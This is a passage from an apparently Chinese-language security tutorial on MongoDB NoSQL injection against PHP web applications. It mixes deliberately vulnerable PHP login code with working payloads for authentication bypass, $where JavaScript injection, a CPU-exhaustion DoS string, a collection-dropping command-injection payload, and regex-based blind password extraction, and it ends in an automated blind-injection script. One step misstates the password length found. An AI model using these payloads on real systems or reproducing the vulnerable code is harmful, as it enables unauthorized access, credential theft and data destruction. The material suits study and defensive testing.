&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>
<p>如下实例，我们查询键 <code>status</code> 值为 A 或键 <code>age</code> 值为 19 的文档。</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>
<p><strong>联合使用</strong></p>
<p>以下实例演示了 AND 和 OR 联合使用，类似于 RDBMS 中的 WHERE 语句： <code>where age&gt;19 AND (name='whoami' OR status='A')</code></p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;, $or: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9176f8aaaf4f21049150&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>
<h2 id="注入时间到"><a class="markdownIt-Anchor" href="#注入时间到"></a> 注入时间到</h2>
<p>按照语言分类</p>
<p>可以分为</p>
<ul>
<li>PHP数组注入</li>
<li>js注入</li>
<li>mongoshell拼接注入</li>
</ul>
<p>按照攻击机制分类</p>
<p>可以分为</p>
<ul>
<li>重言式注入</li>
<li>联合查询注入</li>
<li>js注入</li>
<li>盲注</li>
</ul>
<hr>
<ul>
<li><strong>重言式注入</strong></li>
</ul>
<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
<ul>
<li><strong>联合查询注入</strong></li>
</ul>
<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
<ul>
<li><strong>JavaScript 注入</strong></li>
</ul>
<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
<ul>
<li><strong>盲注</strong></li>
</ul>
<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
<h3 id="php中的注入"><a class="markdownIt-Anchor" href="#php中的注入"></a> PHP中的注入</h3>
<h4 id="重言式注入"><a class="markdownIt-Anchor" href="#重言式注入"></a> 重言式注入</h4>
<p>保证一个永真条件即可</p>
<p>首先在 MongoDB 中选中 test 数据库，创建一个 users 集合并插入文档数据：</p>
<pre><code class="highlight plaintext">&gt; use test
switched to db test
&gt;
&gt; db.createCollection(&#x27;users&#x27;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;
&gt; db.users.insert(&#123;username: &#x27;admin&#x27;, password: &#x27;123456&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;whoami&#x27;, password: &#x27;657260&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bunny&#x27;, password: &#x27;964795&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bob&#x27;, password: &#x27;965379&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;</code></pre>
<p>然后编写 index.php：</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];

$query = new MongoDB\Driver\Query(array(
    &#x27;username&#x27; =&gt; $username,
    &#x27;password&#x27; =&gt; $password
));

$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) &#123;
    foreach ($result as $user) &#123;
        $user = ((array)$user);
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username:&#x27; . $user[&#x27;username&#x27;] . &#x27;&lt;br&gt;&#x27;;
        echo &#x27;password:&#x27; . $user[&#x27;password&#x27;] . &#x27;&lt;br&gt;&#x27;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>
<p>如下，当正常用户想要登陆 whoami 用户时，POST 方法提交的数据如下：</p>
<pre><code class="highlight plaintext">username=whoami&amp;password=657260</code></pre>
<p>进入 PHP 后的程序数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;whoami&#x27;,
    &#x27;password&#x27; =&gt; &#x27;657260&#x27;
)</code></pre>
<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;whoami&#x27;, &#x27;password&#x27;:&#x27;657260&#x27;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;</code></pre>
<p>我们从代码中可以看出，这里对用户输入没有做任何过滤与校验，那么我们可以通过 <code>$ne</code> 关键字构造一个永真的条件就可以完成 NoSQL 注入：</p>
<pre><code class="highlight plaintext">username[$ne]=1&amp;password[$ne]=1</code></pre>
<p>如下图所示，成功查出所有的用户信息，说明成功注入了一个永真查询条件：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>提交的数据进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),
    &#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)
)</code></pre>
<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#123;$ne:1&#125;, &#x27;password&#x27;:&#123;$ne:1&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;</code></pre>
<p>由于 users 集合中 username 和 password 都不等于 1，所以将所有的文档数据查出，这很可能是真实的，并且可能允许攻击者绕过身份验证。</p>
<p>对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们发送 <code>value=1</code> 那么，也就是发送了一个 <code>value</code> 的值为 1 的数据。如果发送 <code>value[$ne]=1</code> 则 PHP 会将其转换为数组 <code>value=array($ne=&gt;1)</code>，当数据到了进入 MongoDB 后，原来一个单一的 <code>&#123;&quot;value&quot;:1&#125;</code> 查询就变成了一个 <code>&#123;&quot;value&quot;:&#123;$ne:1&#125;</code> 条件查询。同样的，我们也可以使用下面这些作为 payload 进行攻击：</p>
<pre><code class="highlight plaintext">username[$ne]=&amp;password[$ne]=
username[$gt]=&amp;password[$gt]=
username[$gte]=&amp;password[$gte]=</code></pre>
<p>这种重言式注入的方式也是我们通常用来验证网站是否存在 NoSQL 注入的第一步。</p>
<h4 id="联合查询注入"><a class="markdownIt-Anchor" href="#联合查询注入"></a> 联合查询注入</h4>
<p>在 MongoDB 之类的流行数据存储中，JSON 查询结构使得联合查询注入攻击变得比较复杂了，但也是可以实现的。</p>
<p>我们都知道，直接对 SQL 查询语句进行字符拼接串容易造成 SQL 注入，NoSQL 也有类似问题。如下实例，假设后端的 MongoDB 查询语句使用了字符串拼接：</p>
<pre><code class="highlight plaintext">string query =&quot;&#123; username: &#x27;&quot; + $username + &quot;&#x27;, password: &#x27;&quot; + $password + &quot;&#x27; &#125;&quot;</code></pre>
<p>当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：</p>
<pre><code class="highlight plaintext">&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#x27;123456&#x27;&#125;</code></pre>
<p>如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：</p>
<pre><code class="highlight plaintext">username=admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;: &#x27;a&amp;password=&#x27; &#125;], $comment: &#x27;123456</code></pre>
<p>拼接入查询语句后相当于执行了：</p>
<pre><code class="highlight plaintext">&#123; username: &#x27;admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;:&#x27;a&#x27;, password: &#x27;&#x27; &#125;], $comment: &#x27;123456&#x27;&#125;</code></pre>
<p>此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：</p>
<pre><code class="highlight plaintext">select * from logins where username = &#x27;admin&#x27; and (password true&lt;&gt; or (&#x27;a&#x27;=&#x27;a&#x27; and password = &#x27;&#x27;))</code></pre>
<p>这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 <code>()</code> 内的条件总是永真的。</p>
<p>但是现在无论是 PHP 的 MongoDB Driver 还是 Nodejs 的 Mongoose 都必须要求查询条件必须是一个数组或者 Query 对象了，因此这种注入方法简单了解一下就好了。</p>
<h4 id="js注入"><a class="markdownIt-Anchor" href="#js注入"></a> js注入</h4>
<h5 id="where-操作符"><a class="markdownIt-Anchor" href="#where-操作符"></a> $where 操作符</h5>
<p>首先我们需要了解一下 <code>$where</code> 操作符。在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码，将 JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分。在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令甚至可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以在自定义的函数里获取数据库的所有信息。</p>
<p>如下实例：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;whoami&#x27;)&#125;&quot; &#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&gt;</code></pre>
<p>由于使用了 <code>$where</code> 关键字，其后面的 JavaScript 将会被执行并返回 “whoami”，然后将查询出 username 为 whoami 的数据。</p>
<p>某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 <code>$userData</code> 获取查询条件：</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == $userData)&#125;&quot; &#125;)</code></pre>
<p>然后，攻击者可能会注入一种恶意的字符串如 <code>'a'; sleep(5000)</code> ，此时 MongoDB 执行的查询语句为：</p>
<pre><code class="highlight plaintext">db.users.find(&#123; $where: &quot;function()&#123;return(this.username == &#x27;a&#x27;; sleep(5000))&#125;&quot; &#125;)</code></pre>
<p>如果此时服务器有 5 秒钟的延迟则说明注入成功。</p>
<p>下面我们编写 index.php 进行测试：</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];
$function = &quot;
function() &#123; 
    var username = &#x27;&quot;.$username.&quot;&#x27;;
    var password = &#x27;&quot;.$password.&quot;&#x27;;
    if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
        return true;
    &#125;else&#123;
        return false;
    &#125;
&#125;&quot;;
$query = new MongoDB\Driver\Query(array(
    &#x27;$where&#x27; =&gt; $function
));
$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username: &#x27;.$user[&#x27;username&#x27;].&quot;&lt;br&gt;&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;password&#x27;].&quot;&lt;br&gt;&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>
<ul>
<li><strong>MongoDB 2.4 之前</strong></li>
</ul>
<p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。</p>
<p>如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;return(tojson(db.getCollectionNames()))&#125;)();var a=&#x27;1</code></pre>
<ul>
<li><strong>MongoDB 2.4 之后</strong></li>
</ul>
<p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;return true//
或
username=1&amp;password=1&#x27;;return true;var a=&#x27;1</code></pre>
<p>如下图所示，成功查出所有的用户信息：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>这是因为发送 payload 进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;$where&#x27; =&gt; &quot;
    function() &#123; 
        var username = &#x27;1&#x27;;
        var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;
        if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123;
            return true;
        &#125;else&#123;
            return false;
        &#125;
    &#125;
&quot;)</code></pre>
<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;$where: &quot;function() &#123; var username = &#x27;1&#x27;;var password = &#x27;1&#x27;;return true;var a=&#x27;1&#x27;;if(username == &#x27;admin&#x27; &amp;&amp; password == &#x27;123456&#x27;)&#123; return true; &#125;else&#123; return false; &#125;&#125;&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c85257f18542b68c4ba&quot;), &quot;username&quot; : &quot;bunny&quot;, &quot;password&quot; : &quot;964795&quot; &#125;
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c88257f18542b68c4bb&quot;), &quot;username&quot; : &quot;bob&quot;, &quot;password&quot; : &quot;965379&quot; &#125;
&gt;</code></pre>
<p>我们从代码中可以看出，password 中的 <code>return true</code> 使得整个 JavaScript 代码提前结束并返回了 <code>true</code>，这样就构造出了一个永真的条件并完成了 NoSQL 注入。</p>
<p>此外还有一个类似于 DOS 攻击的 payload，可以让服务器 CPU 飙升到 100% 持续 5 秒：</p>
<pre><code class="highlight plaintext">username=1&amp;password=1&#x27;;(function()&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();var a=&#x27;1</code></pre>
<h5 id="commmand方法注入"><a class="markdownIt-Anchor" href="#commmand方法注入"></a> commmand方法注入</h5>
<p>MongoDB driver一般都提供直接执行shell命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用，在php官网中就已经友情提醒了不要这样使用:</p>
<pre><code class="highlight plaintext">&lt;?php
$m = new MongoDB\Driver\Manager;
// Don&#x27;t do this!!!
$username = $_GET[&#x27;field&#x27;];
// $username is set to &quot;&#x27;); db.users.drop(); print(&#x27;&quot;$cmd = new \MongoDB\Driver\Command( [
&#x27;eval&#x27; =&gt; &quot;print(&#x27;Hello, $username!&#x27;);&quot;
] );

$r = $m-&gt;executeCommand( &#x27;dramio&#x27;, $cmd );?&gt;</code></pre>
<p>也可以用Command去实现Mongo的<code>distinct</code>方法</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager();

$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$cmd = new MongoDB\Driver\Command([
&#x27;eval&#x27;=&gt; &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;
]);
echo &quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;.$uname.&quot;&#x27;, pwd: &#x27;&quot;.$pwd.&quot;&#x27;&#125;)&quot;;
$result = $manager-&gt;executeCommand(&#x27;sec_test&#x27;, $cmd)-&gt;toArray();
$result =((array)$result[0])[&#x27;retval&#x27;];
$count = count($result);
if ($count&gt;0) &#123;
    foreach ($result as $user) &#123;
        $user=(array)$user;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;用户不存在&#x27;;
&#125;
?&gt;</code></pre>
<p>这个就危险太多了，就相当于把mongo shell开放给用户了，你基本可以构建任何mongo shell可以执行的payload了，如果当前应用连接数据库的权限恰好很高，我们能干的事情更多。如构建</p>
<pre><code class="highlight plaintext">payload:username=2&#x27;&#125;);db.users.drop();db.user.find(&#123;&#x27;username&#x27;:&#x27;2</code></pre>
<h5 id="execute方法注入"><a class="markdownIt-Anchor" href="#execute方法注入"></a> execute方法注入</h5>
<p>在旧版本中，可以用execute来执行一段字符串</p>
<pre><code class="highlight plaintext">&lt;?php

$mongo = new mongoclient();
$uname = $_GET[&#x27;username&#x27;];
$pwd = $_GET[&#x27;password&#x27;];

$db = $mongo-&gt;sec_test; // 选择数据库
$query = &quot;db.users.find(&#123;&#x27;uname&#x27;: &quot;.$uname.&quot;&#125;,&#123;&#x27;pwd&#x27;, &quot;.$pwd.&quot;&#125;)&quot;;
$result = $db-&gt;execute($query);

if ($result-&gt;count() &gt; 0) &#123;
    foreach ($result as $user) &#123;
        echo &#x27;username: &#x27;.$user[&#x27;uname&#x27;].&quot;\n&quot;;
        echo &#x27;password: &#x27;.$user[&#x27;pwd&#x27;].&quot;\n&quot;;
    &#125;
&#125;
else&#123;
    echo &#x27;该用户不存在&#x27;;
&#125;
?&gt;</code></pre>
<p>而在新版本中，多用executeQuery来进行查询</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$function</span> = <span class="string">&quot;function() &#123;if(this.uname == &#x27;<span class="subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
<span class="string">&#x27;$where&#x27;</span> =&gt; <span class="variable">$function</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;用户不存在&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>();

<span class="variable">$uname</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$pwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;uname&#x27;</span>=&gt;<span class="variable">$uname</span>,
    <span class="string">&#x27;pwd&#x27;</span>=&gt;<span class="variable">$pwd</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;sec_test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();

<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span>=(<span class="keyword">array</span>)<span class="variable">$user</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;未找到&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<h4 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h4>
<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能。</p>
<p>我们还是利用第一个 index.php 进行演示：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://127.0.0.1:27017&quot;</span>);
<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="keyword">array</span>(
    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,
    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="variable">$password</span>
));

<span class="variable">$result</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();
<span class="variable">$count</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);
<span class="keyword">if</span> (<span class="variable">$count</span> &gt; <span class="number">0</span>) &#123;
    <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;
        <span class="variable">$user</span> = ((<span class="keyword">array</span>)<span class="variable">$user</span>);
        <span class="keyword">echo</span> <span class="string">&#x27;====Login Success====&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span> . <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;
    &#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">echo</span> <span class="string">&#x27;Login Failed&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>
<p>布尔盲注重点在于怎么逐个提取字符，如下所示，在已知一个用户名的情况下判断密码的长度：</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=.&#123;4&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;5&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;6&#125;    // 登录成功
username=admin&amp;password[$regex]=.&#123;7&#125;    // 登录失败
......</code></pre>
<p>在 <code>password[$regex]=.&#123;6&#125;</code> 时可以成功登录，但在 <code>password[$regex]=.&#123;7&#125;</code> 时登录失败，说明该 whoami 用户的密码长度为 7。</p>
<p>提交的数据进入 PHP 后的数据如下：</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;admin&#x27;,
    &#x27;password&#x27; =&gt; array(&#x27;$regex&#x27; =&gt; &#x27;.&#123;6&#125;&#x27;)
)</code></pre>
<p>进入 MongoDB 后执行的查询命令为：</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;6&#125;&#x27;&#125;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c7b257f18542b68c4b8&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;123456&quot; &#125;
&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;admin&#x27;, &#x27;password&#x27;:&#123;$regex:&#x27;.&#123;7&#125;&#x27;&#125;&#125;)
&gt;</code></pre>
<p>由于 whoami 用户的 password 长度为 6，所以查询条件 <code>&#123;'username':'admin', 'password':&#123;$regex:'.&#123;6&#125;'&#125;&#125;</code> 为真，便能成功登录，而 <code>&#123;'username':'admin', 'password':&#123;$regex:'.&#123;7&#125;'&#125;&#125;</code> 为假，自然也就登录不了。</p>
<p>知道 password 的长度之后我们便可以逐位提取 password 的字符了：</p>
<pre><code class="highlight plaintext">username=admin&amp;password[$regex]=1.&#123;5&#125;
username=admin&amp;password[$regex]=12.&#123;4&#125;
username=admin&amp;password[$regex]=123.&#123;3&#125;
username=admin&amp;password[$regex]=1234.&#123;2&#125;
username=admin&amp;password[$regex]=12345.*
username=admin&amp;password[$regex]=123456
或
username=admin&amp;password[$regex]=^1
username=admin&amp;password[$regex]=^12
username=admin&amp;password[$regex]=^123
username=admin&amp;password[$regex]=^1234
username=admin&amp;password[$regex]=^12345
username=admin&amp;password[$regex]=^123456</code></pre>
<p>这是某个师傅的盲注脚本，贴一下</p>
<pre><code class="highlight plaintext">import requests
import string

password = &#x27;&#x27;
url = &#x27;http://192.168.226.148/index.php&#x27;

while True:
    for c in string.printable:
        if c not in [&#x27;*&#x27;, &#x27;+&#x27;, &#x27;.&#x27;, &#x27;?&#x27;, &#x27;|&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;$&#x27;]:

            # When the method is GET
            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)
            # When the method is POST
            post_payload = &#123;
                &quot;username&quot;: &quot;admin&quot;,
                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c
            &#125;
            # When the method is POST with JSON
            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;$regex&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)
